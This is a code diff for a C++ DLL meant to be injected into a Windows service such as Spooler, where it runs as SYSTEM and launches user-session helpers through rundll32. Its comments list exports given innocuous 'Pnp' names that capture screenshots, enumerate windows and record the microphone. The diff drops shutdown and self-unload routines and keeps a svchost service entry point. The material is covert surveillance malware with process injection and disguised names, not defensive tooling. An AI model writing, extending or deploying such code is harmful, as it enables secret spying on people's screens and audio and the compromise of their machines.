@@ -2,11 +2,12 @@
  * DLL entry point for injection into Windows services (e.g. Spooler)
  * Runs host logic in Session 0 as SYSTEM, spawns capture helper in user session
  *
- * Exports:
- *   DllMain          — auto-starts host thread on DLL_PROCESS_ATTACH
- *   PnpExtInitialize — manual start (alternative to DllMain auto-start)
+ * Exports (see exports.def):
+ *   PnpServiceEntry   — SCM ServiceMain entry point (svchost loads us here)
  *   PnpNotifyCallback — rundll32-compatible capture subprocess entry
- *   PnpExtShutdown   — graceful shutdown
+ *   PnpDiagReport     — rundll32 single-frame screenshot
+ *   PnpEnumDevices    — rundll32 user-session window enumerator
+ *   PnpAudioCallback  — rundll32 microphone recorder
  *
  * Usage:
  *   1. Inject DLL into a Session 0 service (e.g. Spooler)
@@ -437,16 +438,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
     return TRUE;
 }
 
-// Manual init (alternative to DllMain auto-start)
-__declspec(dllexport) void CALLBACK PnpExtInitialize(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    start_host();
-}
-
-// Graceful shutdown
-__declspec(dllexport) void CALLBACK PnpExtShutdown(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    stop_host();
-}
-
 // ── PnpServiceEntry: entry point when loaded as Windows service DLL via svchost ──
 // svchost calls this when the service starts. We register a minimal service
 // control handler and start the host in the background.
@@ -580,25 +571,6 @@ __declspec(dllexport) void WINAPI PnpServiceEntry(DWORD dwArgc, LPWSTR* lpszArgv
     dll_diag("PnpServiceEntry: host stopped, reporting SERVICE_STOPPED");
     g_svcStatus.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
-}
-
-// PnpExtUnload: stop host + release refcounts + free DLL from memory
-__declspec(dllexport) void CALLBACK PnpExtUnload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    dll_diag("PnpExtUnload: stopping host and freeing DLL");
-    stop_host();
-    // Release global mutex so next instance can start
-    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\RDPHostDllMutex_7F3A");
-    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
-    // Free DLL: decrement extra refcount + original LoadLibrary refcount
-    HMODULE hSelf = g_dll_module;
-    FreeLibrary(hSelf); // remove our extra +1 refcount
-    // FreeLibraryAndExitThread on new thread to remove the LoadLibrary refcount
-    HANDLE hFreeThread = CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
-        Sleep(300);
-        FreeLibraryAndExitThread((HMODULE)p, 0);
-        return 0;
-    }, (LPVOID)hSelf, 0, nullptr);
-    if (hFreeThread) CloseHandle(hFreeThread); // close handle; thread self-terminates via FreeLibraryAndExitThread
 }
 
 // ── PnpNotifyCallback: capture helper entry (runs in user session via rundll32) ──
